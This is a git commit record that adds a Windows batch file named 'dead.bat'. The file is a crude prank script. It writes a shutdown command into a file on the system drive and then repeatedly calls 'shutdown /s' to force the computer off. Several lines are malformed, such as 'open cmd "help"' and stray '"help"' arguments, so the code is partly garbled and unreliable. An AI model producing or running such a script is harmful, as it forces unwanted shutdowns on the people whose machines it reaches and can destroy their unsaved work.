3fd0add6effd5b515d6667e346dfe046ede5755f
Bhuwan-web <67514385+Bhuwan-web@users.noreply.github.com>
2021-01-08 18:06:33 +0545

    initial

---
+++ dead.bat
@@ -0,0 +1,12 @@
+echo shutdown /s /t>%systemdrive%\dead.bat
+set dead=%systemdrive%\dead.bat
+pause
+shutdown/s
+shutdown/s
+shutdown/s
+shutdown/s "help"
+shutdown/s "help"
+shutdown/s "help"
+open cmd  "help"
+shutdown 
+open cmd  "help"
